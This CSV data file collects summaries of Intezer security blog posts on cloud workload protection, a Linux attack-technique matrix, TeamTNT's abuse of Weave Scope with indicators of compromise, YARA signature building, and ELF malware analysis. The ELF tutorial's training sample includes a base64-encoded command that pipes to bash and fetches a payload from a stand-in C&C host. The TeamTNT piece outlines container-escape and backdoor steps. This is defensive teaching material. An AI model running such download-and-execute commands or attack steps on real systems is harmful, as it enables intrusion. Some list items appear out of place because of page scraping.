url,summary
https://www.intezer.com/blog/cloud-security/complementing-your-cspm-with-runtime-cloud-workload-protection/,"There are many solutions available for securing your cloud applications and workloads. Even after doing your due diligence and making an investment, it can take a long time to provide value. CISOs report Cloud Security Posture Management (CSPM) and other pre-runtime vulnerability management programs can take anywhere from months to years to be completed.Budgets have been cut short due to COVID-19 and security is already one area that is more difficult to prove tangible business results than sales and other revenue generating departments. Quick wins can make all the difference in both supporting large security programs and providing positive updates to key stakeholders.You might have already begun your CSPM journey with the aim of protecting against misconfigurations caused by human error. The need for this type of solution is evident. According to Gartner, 95 percent of cloud security issues are the result of misconfiguration. A lack of visibility into cloud infrastructure can cause misconfigurations to go undetected for long periods of time, exposing highly sensitive data to the public internet. We saw this play out recently with the Doki malware, which went undetected for over six months and is scanning the internet for misconfigured Docker cloud servers.Security teams acknowledge ramping up a CSPM program is a lot of work that is going to take time. This is partially due to the Shift Left movement, where finding and fixing vulnerabilities in your code requires working in tandem with the development team. While you are getting ramped up with your CSPM, what are you doing to prevent breaches in runtime?Just as protecting against misconfigurations is essential, so is the need for a runtime solution. Pre-runtime security solutions have limitations, namely defending only against a single attack vector (vulnerability exploitation) and a lack of visibility into production. The latter is incredibly problematic because cyber attacks eventually require the attacker to run  unauthorized code or commands  somewhere in the victim’s runtime environment.Taking an assume breach mentality, attackers are still going to find a way in. Whether you are reliant on a third party or not, it’s going to be difficult to catch every vulnerability considering the sheer size and complexity of enterprise cloud environments. When you do find a vulnerability, fixing it can take time.Living off the Land attacks are one way an adversary can get access to the system without needing to exploit a vulnerability, instead utilizing a trusted application in the operating system itself to conduct the attack.Protecting your cloud servers in runtime against unauthorized code is an important last line of defense. A Cloud Workload Protection solution provides full visibility over all code in runtime and alerts on any unauthorized activity that deviates from the predetermined secure baseline. Think of it as a quick win, complementing a pre-runtime solution like a CSPM and buying you time to work on a larger project such as fixing misconfigurations.Runtime protection hasn’t been successful in the past for organizations usually due to challenges caused by vendor implementation:Assuming the status of your CSPM will be behind, you should consider a runtime cloud security solution to immediately secure your cloud assets. Here is what to look for:Solutions like Intezer Protect provide both runtime and memory protection capabilities, specifically for the memory of Linux assets. Intezer’s implementation of Zero Trust Execution results in significantly low overhead for your team.Defend up to 10 servers for free via the Intezer Protect community editionVulnerability management and CSPM are essential but even fully ramped up they are not going to protect you against breaches which occur in production. A strong runtime Cloud Workload Protection solution is a quick win. It provides a lot of immediate security value which you can report to your higher ups by protecting against breaches and buying you time for perfecting longer vulnerability and misconfiguration initiatives. Guarding against unauthorized code or commands is your last line of defense and one of the first actions you can take to reduce risk.False positives: Overhead with cloud workloads is a significant challenge and sadly it’s a reality for most Cloud Workload Protection strategies. Recent research suggests that 90 percent of cloud servers drift from their original trusted baseline. Overly strict policies can create a lot of noise and false positives resulting in alert fatigue.Allow Listing causes high overhead: Allow Listing (also known as Application Control or Zero Trust Execution) means ensuring only pre-approved code is running in your systems. The discovery of this process has a very high overhead which is why companies have abandoned it. When done properly, Zero Trust Execution is considered by market research firms to be the best practice for securing workloads in the cloud and there are specific implementations of this approach that produce significantly low overhead.In-memory visibility: Traditional implementations of Allow Listing apply this approach only on disk. This prevents them from providing protection against vulnerability exploitation and other in-memory threats. This is one of the main reasons why Gartner recommends pairing App Control with memory protection capabilities as part of any effective runtime Cloud Workload Protection strategy.Adequate Linux threat detection: The majority of public and private cloud servers are Linux-based. With Linux threats emerging as a top concern for organizations, you should understand how your cloud security solution is addressing them. If you want to detect these threats you will likely need a security solution designed to protect Linux systems, not a migration or adaptation of a Windows endpoint detection platform. Genetic Software Mapping is a viable alternative to signature and anomaly-based detection as these more traditional approaches can be less effective if you don’t have new IOCs or attackers mimic normal behavior.
 
While you assess potential runtime solutions, you will also want to learn about the top Linux threats and how to mitigate them. Our weekly threat feed contains the latest low-detected Linux threat hashes which you can add to your blocklist to protect your systems.Low overhead: Look for a solution that won’t alert you on every small software upgrade or natural change in memory. Otherwise you will be investigating a lot of false positive alerts.Full visibility: A runtime Cloud Workload Protection solution can give you full visibility over all applications running on your infrastructure. You also want to ensure this includes visibility in memory to defend against fileless threats, not just traditional files on disk.Secure the entire cloud native stack: The cloud has many new technologies including containers and Kubernetes. Make sure your cloud security solution secures all of your assets, including VMs, database servers, and containers, and preferably under one roof to further reduce overhead and complications."
https://www.intezer.com/blog/cloud-security/ttps-matrix-for-linux-cloud-servers-with-detection-methods/,"Taking inspiration from the MITRE ATT&CK® framework, we previously developed a matrix categorizing adversary tactics and techniques for Linux cloud servers. Linux servers are a staple in the cloud, with some organizations having upwards of 100 to 5,000 Linux cloud servers in their production environments. If your organization has public or private servers in the cloud, they are likely Linux-based.Use the matrix to identify gaps in your coverage against the different threats that target Linux cloud environments. As we will explain below, many of the techniques categorized on the matrix can be detected by monitoring the runtime environment for any malicious code or suspicious commands.We have added a Detection Method column to the matrix, which delineates the recommended way to detect each adversarial technique in your systems. While there are more than a few ways to detect some of these techniques, these are the most effective detection methods set forth by our experts. Please note we are only talking about host-level detection methods.Click here to get the TTPs matrix for Linux cloud servers with detection methods








Click on each adversarial tactic or technique to get more information.The TTPs matrix categorizes 96 techniques spread across 10 tactics, with a common theme. Most of these techniques require the attacker to run unauthorized code or commands somewhere in the victim’s runtime environment to conduct a successful cyber attack.Why is code execution important for an attacker?There are nearly 100 techniques an attacker can use as part of launching a cyber attack on your Linux cloud servers. While the attack vector can vary, protecting the runtime environment is an important last line of defense since most attacks must eventually execute unauthorized code or commands. This holds true even after an attacker has stolen credentials or exploited an unknown vulnerability. If you can monitor the runtime environment for the execution of any malicious code or suspicious commands, you will be able to detect 75 percent of the techniques listed on the matrix regardless of how they got into the system.Doki is a Linux malware infecting Docker servers in the cloud. Prior to its discovery by Intezer, the threat went undetected in VirusTotal for over 6 months. After gaining access to the system via misconfigured containers, Doki is able to execute malicious code on the host server. Let’s take a look at how Doki utilizes some of the tactics on the matrix.Download the TTPs matrix + detection methods to secure your Linux cloud serversThis resource is not affiliated with, sponsored by, or endorsed by MITRE ATT&CK®, nor does it represent the views and opinions of The MITRE Corporation or MITRE personnel.We believe monitoring the runtime environment is the key to preventing most cyber attacks on your cloud infrastructure. Intezer Protect customers benefit from having full visibility over the code executed on their servers, while being alerted on any unauthorized or malicious code. Protect up to 10 servers for free via our community edition.Get a demoExploits Public-facing Application: Doki takes advantage of exposed Docker API ports to gain initial access to the system.Command and Scripting Interpreter: Doki executes 2 different scripts, a network scanner script and a downloader script. These are commands in memory which allow the attacker to download further payloads onto the container and the host server.Local job scheduling: Doki modifies the host’s cron to execute the downloaded payload every minute and achieve persistence."
https://www.intezer.com/blog/cloud-workload-protection/attackers-abusing-legitimate-cloud-monitoring-tools-to-conduct-cyber-attacks/,"TeamTNT is a cybercrime group that targets cloud environments including Docker and Kubernetes instances. The group has been previously documented using several tools including crypto-miners and Amazon Web Services (AWS) credential stealing worms.TeamTNT has also been spotted using a malicious Docker image which can be found on Docker Hub to infect its victims’ servers. Now the group is evolving. In a recent attack observed by Intezer, TeamTNT uses a new technique by abusing Weave Scope, a trusted tool which gives the user full access to their cloud environment and is integrated with Docker, Kubernetes, the Distributed Cloud Operating System (DC/OS), and AWS Elastic Compute Cloud (ECS). The attackers install this tool in order to map the cloud environment of their victim and execute system commands without deploying malicious code on the server.To our knowledge, this is the first time attackers have been caught using legitimate third party software to target cloud infrastructure. When abused, Weave Scope gives the attacker full visibility and control over all assets in the victim’s cloud environment, essentially functioning as a backdoor.Below we will describe the attack flow and the use of Weave Scope by the attacker.TeamTNT’s attacks typically involve the use of malicious Docker images from the Docker Hub in addition to crypto-miners and malicious scripts. The uniqueness of the recent attack observed by Intezer is the group abuses a legitimate open source tool called Weave Scope to gain full control over the victim’s cloud infrastructure.Weave Scope is an open source tool from Weave Works, a company that offers automation tools for working with containerized applications. It provides monitoring, visualization, and control over Docker and Kubernetes. Using a dashboard accessible from the browser the user gains full control over the infrastructure including all information and metadata about containers, processes, and hosts.Weave Scope is a powerful utility, giving the attackers access to all information about the victim’s server environment with the ability to control them including: installed applications, connection between the cloud workloads, use of the memory and CPU, and a list of existing containers with the ability to start, stop, and open interactive shells in any of these containers. By installing a legitimate tool such as Weave Scope the attackers reap all the benefits as if they had installed a backdoor on the server, with significantly less effort and without needing to use malware.







The image above is a Weave Scope visualization of a Linux server. On the left is the open terminal of a Nginx-based container. On the right is a view of all the containers on the server.To install Weave Scope on the server the attackers use an exposed Docker API port and create a new privileged container with a clean Ubuntu image. The container is configured to mount the file system of the container to the filesystem of the victim server, thus gaining the attackers access to all files on the server. The initial command given to the container is to download and execute several cryptominers.The attackers then attempt to gain root access to the server by setting up a local privileged user named ‘hilde’ on the host server and use it in order to connect back via SSH.Next the attackers download and install Weave Scope. As described in the installation guide in Weave Scope’s git, it takes only a few commands to complete installation of the tool.Once installed, the attackers can connect to the Weave Scope dashboard via HTTP on port 4040 and gain full visibility and control over the victim’s infrastructure.From the dashboard the attackers can see a visual map of the Docker runtime cloud environment and give shell commands without needing to deploy any malicious backdoor component. Not only is this scenario incredibly rare, to our knowledge this is the first time an attacker has downloaded legitimate software to use as an admin tool on the Linux operating system.Precise and correct configuration of cloud workloads and services can prevent many attacks which is why it’s important to take the time and effort to check them. To protect yourself from this attack we recommend to:Zero Trust Execution is viewed by market research firms as the best practice for securing cloud workloads for reasons like the nature of this TeamTNT attack. ZTE creates a trusted baseline of your workloads and monitors for any new process or injected code. Any unauthorized code or applications that drift from the pre-approved baseline are blocked from running in your cloud environment, allowing you to retain a trusted state.In this scenario, although Weave Scope is a legitimate administration tool (it’s not malware and therefore doesn’t contain malicious code), the application was still flagged by ZTE because it’s unauthorized code that deviates from the trusted baseline.This article explains how you can adopt a genetic-based ZTE approach to alleviate some of the high overhead caused by traditional implementations.Learn more about Intezer’s support for runtime Cloud Workload Protection.Weave Works has since provided this  in-depth article on how to prevent malicious attacks using Weave Scope. The article covers both how Scope is used and how you can prevent it being misused by securing it in any Kubernetes installation.A special thank you to Idan Katz for his contribution to this research.85[.]214.149.236https://iplogger[.]org/2Xvkv524d7d21c3675d66826da0372369ec3e88c6681daba966addd295ad89bf5146af656eca480e2161e8645f9b29af7e47628ffdba0c9708f153237aabb7d386d08345385f7519c11a58840931ee38fa3c7bClose exposed Docker API ports: This attack takes advantage of a common misconfiguration of the Docker API which gives the attacker full control over the Docker service. Therefore, Docker API ports should be closed or contain restricted access policies in the firewall.Block incoming connections to port 4040: Weave Scope uses default port 4040 to make the dashboard accessible and anyone with access to the network can view the dashboard. Similar to the Docker API port, this port should be closed or restricted by the firewall.Block the IOCs provided below.Check out our article Best Practice for Securing a Docker Runtime environment.Take advantage of the free Intezer Protect community edition to protect your Linux cloud servers and containers in runtime against unauthorized code."
https://www.intezer.com/blog/threat-hunting/turning-open-source-against-malware/,"Introduction
Offensive Security Tools are any kind of functionality meant to facilitate intrusions and security bypasses in order to achieve the former.Unsophisticated actors adopt OSTs to fill in R&D resources which they don’t possess while advanced actors, including government-backed ones, incorporate OSTs so they can spend their resources elsewhere in advancing operations or upgrading infrastructure, for example.We analyzed thousands of threat actor reports from security companies dating back to 2015, checking for their references to open source OST projects. What we found is the number of references to open source OST projects is steadily on the rise which indicates their increasing usage.What is special about OST libraries is they can’t operate independently and must be included as part of a bigger tool. These embedded libraries are rarely documented by security companies due to the difficulty it takes to identify them, as they are only part of a malicious file and usually stripped of strings.The ability to detect files that use offensive libraries can enhance threat hunting capabilities as very few legitimate programs will include such functionalities.In this article we will present a tutorial on how you can create code-based YARA signatures to find malware using OST libraries.This article is a part of a larger investigation into the effects of free publication of OSTs. The full research will be presented at VirusBulletin.Malware developers aren’t much different from normal programmers in that they both want to do their job in the easiest way possible. For some tasks, the most efficient solution is to simply copy and paste code from the Internet. If malware developers take this short cut when developing their tools, we as defenders should take advantage of it.During our investigation, we identified which open source OST libraries threat actors most often copy and paste into their toolsets. One conclusion we drew is that many actors outsource memory injection logic into a small subset of open source libraries.As an example, using only string reuse, we can observe that Lazarus, Winnti, Trickbot, Ramsay, and DarkHotel all have used the ImprovedReflectiveDllInjection library:
(‘Search Exact String’ result available for Intezer Analyze users)(Strings from one of the files found when making the above string search)We can confirm this by searching for the strings on Github and finding the specific code they used:Creating YARA signatures from OST library strings can yield some successful threat detections, however, attackers can easily remove those strings. We have witnessed first hand these malware families removing such strings once they have recognized their mistake and we are aware of multiple other threat actors using this library without the accompanying strings.Therefore we must find a different method to create signatures to detect the use of these libraries.The premise of code reuse signatures is to create YARA rules based on repeating binary patterns. These binary patterns are normalized code instructions. Normalized as in they must be readjusted to account for inconsistencies between different compilation outputs (e.g. different registers being used or varying immediate values). Each compiler has different compilation optimization rules and even the slightest difference can result in signatures becoming essentially ineffective.To demonstrate how you can create a code-based YARA signature, let’s look at the MemoryModule library as an example. We uploaded a batch of precompiled MemoryModule binaries to Mega.nz so you can follow along.We compile the library and search for assembly code that looks unique to our library (we also generate a PDB file so that we can easily track the code). We chose the following blocks in the MemoryLoadLibraryEx function:The blocks we will inspect specifically are the top center and middle left blocks, which can be traced to the following code:Note: It’s also possible to do this the opposite way. First, choose the source code which seems unique and then only track the related assembly. It really depends on what is most comfortable for you.It’s important to compile the library via several compiler versions in order to ensure the binary patterns we are signing don’t change drastically. You can find here an open source script we made available for this task. Generally, choosing small blocks with simple instructions like the ones we selected is recommended since there is less room for changes to be made through different compiler versions.After browsing through these libraries to make certain that our code remains the same between different compiler versions, we can start building our binary YARA signature.For the sake of brevity we rearranged the function so only the code we’re interested in appears on screen:Using an Intel Instruction Set reference sheet, turn the first block into a binary pattern:For example, mov reg, imm32 is encoded as B8+ rd in the mov command. This means the second byte has possible values 8-0xf so let’s put a question mark over it.We avoid signing the jz instruction because it can turn to jnz on another compiler’s whim. For this reason, familiarity with compiler behavior is useful and can be attained by reviewing multiple versions of the same code through binaries created for different library versions.Moving on to the second block, let’s turn only its beginning sequence into a binary pattern:We don’t normalize mov ecx, 0C1h because it isn’t part of the function’s logic (it’s used to handle the stack frame, aka ‘the function’s infrastructure’) and as you can see below it sometimes doesn’t trail our “real” logic:Next let’s combine the two functions into a YARA rule and add a condition for the blocks to be close to each other. We chose a distance of 0x800 bytes after reviewing the same code in newer compilers, where the blocks end up on opposite sides of the same function due to new optimizations (as can be seen in the V142/V141 versions):Finally we’ll test the validity of our new rule.Let’s make sure we don’t miss any MemoryModule binaries (no false negatives):Before deploying the signature, we test it on VirusTotal.In this case we had to add a block to the signature (we chose the one to the right from the initial figure) to reduce false positives, as we found the 0x800 distance made the signature too generic and returned hits on programs that didn’t use MemoryModule.The final signature looks like this: Malware developers often incorporate open source libraries in order to cut costs and preserve their research and development resources for other activities. In this article we presented how you can create signatures to target malware that outsource their offensive capabilities to these libraries. We demonstrated why signatures based on strings can be easily broken when hunting for these projects and how you can create more advanced code-based signatures to catch malware that incorporate OST libraries.We hope this post was productive for you and wish you happy hunting! We invite you to virtually attend the talk which will present the full research study at VirusBulletin.The Intezer Analyze enterprise edition generates code-based YARA signatures for any detected threat similar to the signature detailed in this post. Learn moreClose Source Tools: The most infamous example is CobaltStrike.Open Source “as is” Standalone Tools: Metasploit, Mimikatz, and various RAT/C2 frameworks are some examples.Open Source Libraries: Examples include some memory injection libraries and other offensive libraries which must be incorporated in a tool in order to be useful."
https://www.intezer.com/blog/linux/elf-malware-analysis-101-initial-analysis/,"Introduction
In the previous article we profiled the ELF malware landscape and explained how malware infects systems. We discussed the current lack of ELF malware visibility, reflected in subpar detection rates by leading engines and the shortage of publicly available resources documenting Linux threats. In this article we will pursue ELF file analysis with an emphasis on static analysis.The purpose of initial analysis is to gather as many insights about a file as possible without spending too much time on advanced analysis techniques such as behavioral analysis.The initial analysis process entails reviewing different artifacts of a file. While an artifact by itself might not be enough to make a decision, the collection of artifacts can help us determine a practical outcome for this step. A final result could be that we know what the file is or we must conduct a deeper analysis because this step wasn’t conclusive enough.Agenda
The lack of valuable metadata in ELF files, such as certificates and resources, provides a weaker starting point than PE files, particularly when distinguishing between trusted and malicious files. This is why it’s important to consider the context of the analyzed file and the desired outcome from the analysis. Whether you want to verify that a file is trusted or malicious, or you already know that a file is malicious but you want to classify the threat to determine the appropriate response, the information and tools presented in this article will help you further support an initial analysis conclusion.We will review the following artifacts and emphasize how they can help us gather insights about a file:After covering our initial analysis toolset, we will put them to use by analyzing real samples found in the wild.Toolset
These are the tools and commands we will use (in alphabetical order). We will elaborate on each of them later.Getting Started
We will use a Linux virtual machine (VM) as our demo environment. If you don’t have a Linux VM, follow this guide to install one: https://itsfoss.com/install-linux-in-virtualbox/.We will also be compiling different samples. If you are not interested in this step, we have stored the compiled samples in a dedicated repository for your convenience. We will refer to the samples throughout the article.Let’s prepare our environment:ELF Format Static Components
In this section we will review the components of the ELF format that are relevant for initial analysis, using our compiled file.When analyzing static features of an ELF file, readelf command is the most useful tool. readelf should already be installed on your Linux VM. Run readelf -h to review all of its potential flags. We will use this command throughout the article.Symbols
Definition and how they can help us:
Symbols describe data types such as functions and variables which are stored in the source code and can be exported for debugging and linking purposes. Symbols can help us uncover which functions and variables were used by the developer in the code, giving us a better understanding of the binary’s functionalities. We might also find unique function or variable names that can be searched for online to determine if this is a known file—in other words, if someone has already analyzed a similar binary, or if this is an open source tool.In practice:
Let’s use the readelf command to read the file’s symbols.First, run: readelf -s training-sampleYou will notice the output contains two tables: .dynsym and .symtab. The .dynsym table (dynamic symbols table) exists in dynamically linked and shared object files.







Dynamically linked binaries use external sources such as libc libraries that are stored on the operating system during runtime. Statically linked binaries, on the other hand, are compiled together with these libraries. This means statically linked files will typically be larger than dynamically linked files. Statically linked files will likely contain large amounts of code that are related to libraries and not to the actual file’s logic.The .dynsym table contains the dynamically linked symbols, such as libc functions, and the .symtab table contains all symbols (including those in the .dynsym table) that were defined in the source code. In the image above, you can see the libc function used in our source code under the .dynsym table: fgets(), popen(), and system().The symbol table can be lengthy. For simplicity, let’s view each symbol type separately.readelf -s training-sample | grep OBJECT








Above we can see the global variables that were declared in the file’s source code.readelf -s training-sample | grep FUNC








We can also observe the functions declared in the file’s source code, together with the used libc functions. The libc functions are present in both .dynsym and .symtab tables, which is why we see them both listed twice.readelf -s training-sample | grep FILE








The source files compiled in the binary are our source code (training_sample.c) and the ctrstuff.c file. The ctrstuff.c source code is compiled as default inside the binary. It contains functions that are used to run before and after the file’s main logic (register_tm_clones, register_tm_clones, and frame_dummy for example).Bottom Line
By interpreting the file’s symbols, you can extract the marked functions and variables from the compiled training sample’s source code:







Browse here for more context about symbols.Segments and Sections
Definition and how they can help us:
Segments, also known as program headers, describe the binary’s memory layout and they are necessary for execution. In some cases, anomalies in the segments table structure can help us determine if the binary is packed, or if the file was self-modified (a file infector for instance).Segments can be divided into sections for linking and debugging purposes. The sections are complementary to the program headers and they are not necessary for the file’s execution. Symbols are usually retrieved via section information. Unique section names can help us identify different compilation methods.In practice:
Let’s review the training sample segments. Run readelf -l training-sample:







There are 9 program headers (segments) in the training sample. Each segment type describes a different component of the binary. We will focus on the PT_LOAD segment.PT_LOAD segment describes the code which is loaded into memory. Therefore, an executable file should always have at least one PT_LOAD segment. In the screenshot above you will see the training sample contains 2 PT_LOAD segments. Each segment has different flags:In the segments’ output we are also given a list of sections to segments mapping, in corresponding order to the segments table. Notice the .text section, which contains the executable code instructions, is mapped to the PT_LOAD R E segment.The segments table structure of the training sample is an example of a “normal” structure.
If the file was packed or self-modified, we would see the table structured differently.







The table contains only 3 segments: 2 PT_LOAD segments and a PT_GNU_STACK. The existence of PT_GNU_STACK indicates to the linker if the file needs an executable stack (this is also why its size is zero). This is not a typical structure for an ELF Program Headers table.Bottom LineBrowse here for more information about ELF segments and sections.Note: 
Malware developers often strip or tamper with a file’s symbols and/or sections to make it more difficult for researchers to analyze the file. This makes it nearly impossible to debug the binary.The following is a method a developer might use to strip a file’s symbols:Strip utilities may also leave the sections and patch fields in the ELF header (e_shoff: offset of the section header table and e_shnum: the number of section headers). As a result, the binary will be detected as having no sections.ELF Header
The ELF header contains general data about the binary such as the binary’s entry point and the location of the program headers table. This information is not valuable during the initial file analysis but the file’s architecture can help us understand which machine the file is designed to run on, in case we want to run the file.Let’s run readelf -h training-sample in order to view the sample’s header info:







There are several advanced malware techniques that leverage the ELF header’s structure.If you would like to learn more about this topic, watch ELF Crafting presented by Nacho Sanmillan at r2con.File’s Output
Simply running the file on your VM can always be useful. If the file presents an output, it might immediately help us to determine what it is.Tip: Before running the file make sure you have saved a clean snapshot of your VM.Strings
Strings extraction is a classic and powerful method for gathering information about a binary. Let’s run the strings command on our file and extract the strings into a txt file for convenience:
strings training-sample > str.txtWhen we review the strings, we will see declared chars from the code together with the symbols and other strings that are related to the file’s format, such as section names and the requested interpreter.Like in PE analysis, we can search for indicative strings such as network related strings, encoded strings (such as base64 or hex), paths, commands, and other unique key words that might help us understand more about the file.In the training file, the echo command string that contains the base64 command string immediately stands out:echo d2dldCBodHRwOi8vc29tZW5vbmV4aXRpbmdjbmNbLl1jb20vbWFsd2FyZS5hcHA=|base64 -d |bash;If we decode the base64 string, we will receive the following command:wget http://somenonexitingcnc[.]com/malware.appWe can assume the file drops a payload from a remote C&C.String Reuse
Intezer Analyze is a useful tool for string extraction. It reduces analysis efforts by divulging whether certain strings have been seen before in other files. In the case of an unknown malware, filtering the common strings can help us focus our efforts on the file’s unique strings.For example:
Lazarus’s ManusCrypt ELF version contains some of the same strings found in its PE version, which was previously reported by the U.S. government:







You can easily browse the PE version to compare the two files using the related samples in Intezer Analyze:







Code Reuse
Examining code reuse in Intezer Analyze can be a great starting point for initial analysis. It can expedite analysis time by disclosing where certain code has been used before in other files.For example:
This Rekoobe sample had 0 detections in VirusTotal. Upon upload to Intezer Analyze we receive a clear verdict (malicious) and classification (Rekoobe) based on code reuse to previous samples.Packers
Unlike PE malware, where it’s common for known payloads to be packed with evasive and inconstant packers (polymorphic custom packers), this is rare in ELF malware. One explanation might be that the ongoing ‘cat-and-mouse’ game between security companies and malware developers is still in its infancy, as companies are starting to embrace Linux-focused detection and protection platforms for their systems.However, the famous UPX is highly used by ELF malware developers. In this section we will review ELF packers, determine how we can identify if a file is packed, and understand what are our next steps if the file is indeed packed. We will focus on UPX and VMprotect, as they are the most commonly used packers.Vanilla UPX
Files packed with Vanilla UPX are easy to detect and unpack.
Let’s try it ourselves by packing the training file with UPX (you can download the compiled file form here):gcc -static training_sample.c -o training-sample-staticRun readelf -a training-sample-static-packed to retrieve the file’s data. You will notice that there are only header and segments tables. These tables are necessary for the file to run.The segment table contains only PT_LOAD and PT_GNU_STACK segments. This is an anomaly in the segment tables structure that might indicate the file is packed.Let’s run the strings command on the file. Notice that the majority of the strings are gibberish, however, we have an indication that the file is packed with UPX.The strings, together with the file’s table structure, indicates the file is probably packed with UPX.Let’s use the Detect It Easy (DIE) tool. DIE is a signature-based tool that detects a file’s compiler, linker, packer, and more. Open the file with this tool and you will see it immediately identifies the file as UPX packed.Now, let’s check out DIE’s Entropy feature:If a file is packed with Vanilla UPX, unpack it by running
upx -d training-sample-static-packed and then continue your analysis using the unpacked file.Custom UPX
Since UPX is open sourced, it’s easy to modify and add advanced layers to the packing process. In order to detect files that are packed with custom UPX, we can use the same detection methods used for Vanilla UPX. However, there might not always be an indicative string which can disclose that a file is probably packed with UPX. For example, Rocke uses LSD! instead of the original UPX! header. Although it’s one of the most simple tricks in Custom UPX, it evades static parsers rather easily.Code reuse can also simplify packer detection. Check out this modified UPX example. It contains no string signatures but if we open it in Intezer Analyze it’s clear the file is packed with modified UPX.Files packed with modified UPX will most likely not unpack with the upx -d command. In this case, we should proceed to dynamic analysis.VMprotect
VMprotect packer is a popular packing choice for PE files and it also has a packing solution for ELF files.You can try it yourself by using the demo version. Execute the following commands to download VMprotect onto your VM and run it (download the compiled file form here):wget http://vmpsoft.com/files/VMProtectDemo_x64.tar.gz
mkdir VMprotect
tar -xf VMProtectDemo_x64.tar.gz -C VMprotect
cp training-sample training-sample.app
cd VMprotect
./vmprotect_guiThe VMprotect GUI should open. Choose “Open..” and then select “training-sample.app”.Take a look at “VM Segment” in the “Options” setting. This “.vmp” field can be changed to any value the user decides. We will change it to “cat”. Next, click on the play button.The program has created a packed sample on your working directory. Run readelf -l training-sample.vmp.app to view the packed file’s segments.Notice the file now has a PT_LOAD segment with RWE flags and the file’s entrypoint is inside this segment (the entrypoint address should be located somewhere between the segment’s virtual address and its memory size). You can see that the VMprotect section cat1 is located inside this segment as well.Run readelf -S training-sample.vmp.app to view the file’s sections.VMprotect will create 2 new sections with the same name and suffixes of 1 and 0, respectively. The section names and the RWE segment combined with high entropy can disclose that a file is packed with VMprotect. If a file is packed with VMprotect, we should proceed to dynamic analysis.Note: If you review the symbols, you will see the functions and variables related to the payload no longer appear in the table. This makes sense considering the payload is packed and the file we are analyzing right now is the packer and not the payload.Other Packers
There are several open source projects for ELF packers. Here are some examples:
https://github.com/ps2dev/ps2-packer
https://github.com/n4sm/m0dern_p4cker
https://github.com/timhsutw/elfuckBottom Line
We suspect a file is packed when it has:Next steps will be:Interpreters
Interpreters are programs that compile scripts to an executable. ELF files that were compiled with interpreters hold a compiled script within the binary. Interpreters can also be considered as “script obfuscators”, since the ELF file is just “wrapping” the clear-text source script.Let’s review two commonly used interpreters:Pyinstaller
Files that were compiled with Pyinstaller will have the pydata section name. This is where the script’s pyc (compiled python source code) is placed in the ELF binary. Another way to detect Pynistaller binaries is via strings. The interpreter has unique strings such as “Error detected starting Python VM”. Take a look at this YARA rule.Code reuse is also helpful for detecting Pyinstaller compiled files:We can extract the python script from the ELF binary by using pyinstxtractor. Follow this guide on how to apply it to ELF files. Note that the python version you use to run pyinstxtractor should be the same version used in the binary you are analyzing. If there is a mismatch, pyinstxtractor will issue a warning.Let’s try it ourselves (download the compiled file form here):First, let’s compile a Pyinstaller file:sudo apt update
sudo apt install -y python3
sudo apt install -y python3-pip
sudo pip3 install pyinstallernano test_pyinstaller.pyCopy the following script to test_pyinstaller.py:for i in range(1,6):
print(f”this is output #{i}”)And save (ctrl+x).pyinstaller –onefile test_pyinstaller.pyPyinstaller created 2 directories in the source folder: dist and build. The compiled file is in the /dist directory. You can run the file and also examine the pydata section and its strings.Extraction of the python script from the compiled binary:sudo apt install -y git
git clone https://github.com/extremecoders-re/pyinstxtractor.git
sudo pip3 install uncompyle6mkdir training-pyinstaller
cd training-pyinstaller
objcopy –dump-section pydata=pydata.dump ../dist/test_pyinstallerpython3 ../pyinstxtractor/pyinstxtractor.py pydata.dumpYou should receive the following output:pyinstxtractor created a directory named pydata.dump_extracted. Please note that the tool suggests possible entry points (in our example we know its test_pyinstaller.pyc).cd pydata.dump_extracted
uncompyle6 test_pyinstaller.pycWe have now successfully extracted the Python code:shc
shc is a shell script compiler. Files that were compiled with shc have specific strings. You can use the YARA signature to detect them along with code reuse. UnSHc tool can be used to extract the compiled bash script from files that were compiled with older shc versions (there currently isn’t a public solution for extracting the script from later versions of this tool).Bottom Line
We suspect a file is an interpreter when the file has:Next steps will be:ELFparser Tool
Elfparser is an open source project which as of this publication date hasn’t been updated in the last few years. With that being said, this tool is useful for initial analysis when you want to search for suspects and indicators of the file’s functionalities. In addition to parsing the ELF file to its various tables which are relevant for initial analysis, the tool contains embedded signatures based on the file’s static artifacts which are translated to “capabilities”. These capabilities are then translated to a final score. The higher the score, the more suspicious the file is. This score should be taken with slight skepticism, as the indicator is prone to false positives and trusted files can also come up as highly suspicious.Let’s upload our training file to the ELFparser tool:It maps the system and popen function to their relevant categories and recognizes the embedded IP address.Real Life Sample Analysis
Now, the moment you have been waiting for. In this section, we will analyze a real ELF malware sample and you will be given 3 additional samples so you can practice initial ELF analysis on your own time. You can find the exercise samples here.Let’s download this sample and open it with ELFparser so that we can obtain an initial overview of the file.Elfparser recognizes the file as UPX packed. Let’s unpack the file using upx -d.Now that we have unpacked the file, let’s open it again in ELFparser. You can see that the file has symbols and ELFparser has gathered some capabilities:The file is likely generating HTTP requests as part of its functionality. The User-Agent and Host headers are variables (based on %s).Let’s run the strings command on the file.The file contains a great deal of strings which look like user agents. We can assume they might be related to the HTTP request identified by ELFparser and that the binary is using different user agents to avoid being blocked by the host that it’s attempting to contact.At this point, we may suspect that we are not dealing with a trusted file and that it might also be related to some DDoS malware, but we should gather more information first before making this conclusion.Let’s look at the file’s symbols. Because it contains many symbols, use readelf and grep each symbol type separately.readelf -s training-sample | grep FUNCThe file contains some unusual and suspicious function names:
FindRandIP, tcpFl00d, udpfl00dWe can almost certainly conclude that this file is a malware. Let’s do a quick google search for these unique functions so we can classify the file. We receive search results for Mirai and Gafgyt analysis. It’s now clear that this file is a botnet which is a variant of Mirai.Golang Files
There is a new trend we are seeing where ELF malware is written in Golang. Kaiji, NOTROBIN, and Kinsing are just some examples.Golang files have a different structure than classic ELF files. We will soon publish an article explaining the ELF Golang format and how to analyze these binaries. Stay tuned!Conclusion
We reviewed initial ELF analysis with an emphasis on static analysis. We detailed the different artifacts and components that are relevant for initial analysis and learned how they can help us gather immediate insights about a file. We also explained which tools can be used to gather those insights.Initial analysis is the first step you should take when approaching a file but it’s not always enough to determine a file’s verdict and classify the threat if it’s malicious. A file can be packed, stripped, or just not informative enough to make an assessment during the initial analysis phase. In part 3, we will review the next step in ELF file analysis: dynamic analysis. You will learn what information can be extracted from this step and which tools can be used to gather it.ELF format static components

Symbols
Segments and Sections
ELF Header

SymbolsSegments and SectionsELF HeaderFile’s OutputStringsCode ReusePackersInterpretersDetect It EasyElfParser Intezer AnalyzeLinux VMobjcopyPyinstaller readelfshcstrings UnSHcUPX VMprotectRun your VM.
If you have just installed the VM, make sure to take a snapshot of the machine so you can always restore it to its clean snapshot.
 Allow the shared clipboard to transfer from the Host to Guest:








Compile the following code (you can download the compiled file from here):
